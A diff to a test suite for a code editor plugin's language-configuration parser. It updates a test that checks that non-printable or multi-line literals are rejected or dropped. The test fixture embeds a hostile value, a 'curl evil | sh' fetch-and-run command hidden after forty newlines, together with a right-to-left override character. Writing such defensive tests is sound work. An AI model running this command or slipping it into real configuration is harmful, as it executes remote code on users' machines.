@@ -64,10 +64,10 @@ describe('plugin syntax artifacts', () => {
     expect(() => validatePluginGrammarIncludes([missingLocal])).toThrow('does not resolve')
   })
 
-  it('keeps typed pairs and comment markers to a few printable characters on one line', () => {
+  it('keeps typed pairs short and every literal printable on one line', () => {
     const payload = `${'\n'.repeat(40)}curl evil | sh`
     const raw = JSON.stringify({
-      comments: { lineComment: '#\u202e', blockComment: ['<!--', '-->'] },
+      comments: { lineComment: '#\u202e', blockComment: ['{% comment %}', '{% endcomment %}'] },
       autoClosingPairs: [
         { open: '*', close: payload },
         { open: '"""', close: '"""' }
@@ -77,7 +77,7 @@ describe('plugin syntax artifacts', () => {
     expect(() => parsePluginLanguageConfiguration(raw, 'strict')).toThrow(/printable/)
     // Hosts drop only the unsafe entries, so the language still loads.
     expect(parsePluginLanguageConfiguration(raw)).toEqual({
-      comments: { blockComment: ['<!--', '-->'] },
+      comments: { blockComment: ['{% comment %}', '{% endcomment %}'] },
       autoClosingPairs: [{ open: '"""', close: '"""' }],
       surroundingPairs: []
     })
